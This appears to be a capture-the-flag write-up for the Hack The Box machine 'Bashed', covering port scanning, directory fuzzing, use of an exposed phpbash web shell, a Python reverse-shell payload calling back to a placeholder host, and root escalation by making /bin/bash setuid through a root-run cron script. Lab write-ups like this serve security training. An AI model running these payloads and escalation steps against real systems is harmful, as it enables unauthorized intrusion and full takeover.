# Box: Bashed
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A 10.129.38.185 -v -p- -T4```

```
Nmap scan report for 10.129.38.185
Host is up (0.14s latency).
Not shown: 65435 closed tcp ports (reset), 99 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/27%OT=80%CT=1%CU=39715%PV=Y%DS=2%DC=T%G=Y%TM=658B8D
OS:24%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=109%TI=Z%CI=I%TS=8)SEQ(SP=
OS:FF%GCD=1%ISR=109%TI=Z%CI=I%TS=8)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53
OS:CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=7120%W2=7120%
OS:W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.011 days (since Wed Dec 27 03:18:25 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   142.55 ms 10.10.14.1
2   140.40 ms 10.129.38.185

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 27 03:34:13 2023 -- 1 IP address (1 host up) scanned in 1127.11 seconds
```
From our scan we have one open port, port 80 which runs on http. So, our enumeration today will be focused on port 80.



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d090655b-9177-467d-90fb-4da5a3dd7916)

Lets fuzz for directories using ffuf

command:```ffuf -u "http://10.129.38.185/FUZZ" -w /usr/share/wordlists/dirb/common.txt  -e .zip,.sql,.php,.phtml,.bak,.backup```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/bashed]
└─$ ffuf -u "http://10.129.38.185/FUZZ" -w /usr/share/wordlists/dirb/common.txt  -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.38.185/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 141ms]
    * FUZZ:

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 153ms]
    * FUZZ: config.php

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 159ms]
    * FUZZ: css

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 139ms]
    * FUZZ: dev

[Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 161ms]
    * FUZZ: fonts

[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 150ms]
    * FUZZ: images

[Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 156ms]
    * FUZZ: index.html

[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 146ms]
    * FUZZ: js

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 162ms]
    * FUZZ: php

[Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 139ms]
    * FUZZ: server-status

[Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 145ms]
    * FUZZ: uploads

:: Progress: [32298/32298] :: Job [1/1] :: 272 req/sec :: Duration: [0:02:08] :: Errors: 0 ::
```

We have lots of directories here, the directory that interests me is the ```/dev``` directory.

Navigating to that directory, you should see this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4c5d1793-7711-46b3-b41c-bbe8b074cf7a)

We have 2 files here, clicking on ```phpbash.php``` should get you this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed1c803e-17df-45b0-b9bd-288b7177ae35)

Lets try to run basic linux commands like ```id``` and ```whoami```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7a4febc4-5d86-458d-9b19-990ca4d062cc)

nice nice, we can exploit this



# Exploitation

We can get a reverse shell back to our machine from this actually

payload:```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'```

Ensure you provide your```LHOST``` and ```LPORT```

Also, ensure to set up your netcat listener 

Executing the payload and checking my netcat listener I spawned a shell

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/92c89b45-3041-4cd0-885a-94c4a4b2e585)

To stabilize the shell

```
python -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/aa5febcd-fc02-47bc-8557-aa51987b871b)

Lets go ahead and escalate our privileges




# Privilege Escalation

Running the ```sudo -l``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8c977156-e16a-4603-86b4-42c9772bb8fb)

We can see that user ```www-data``` can run any command as user ```scriptmanager``` without a password. 

So, to drop into a shell as user ```scriptmanager```, we can run this command ```sudo -u scriptmanager /bin/bash```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/885a3488-be43-4547-a70b-419901f1dc7b)

nice nice, lets further escalate our privileges

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/42aa5cce-c5e5-4883-ad3b-ba8757e31b7f)

Checking the contents of the ```test.py``` file, you should get this

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```
This file is actually being ran by root every couple minutes. We'll replace the content of this script with the python script below

```python
import os

os.system('chmod +s /bin/bash')
```
What this script will do is change the permissions of the ```/bin/bash``` executable using the ```os.system``` function. So, by simply running ```bash -p``` we should be able to spawn a shell as the root user

Now, replace the content of the test.py with the above python code

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ccdbd18b-f503-4f37-be3c-02f0b92eca38)

After one minute, run the command ```ls -l /bin/bash```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/24e55f02-3e3c-4786-b834-ae99e2942a05)

Lets execute this using the command ```bash -p```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e2e22771-1bc6-4417-9dbe-15417791b09c)

Cool, we spawned a root shell😎

This was a very easy box though😅


That will be all for today
<br><br>
[Back To Home](../../index.md)





























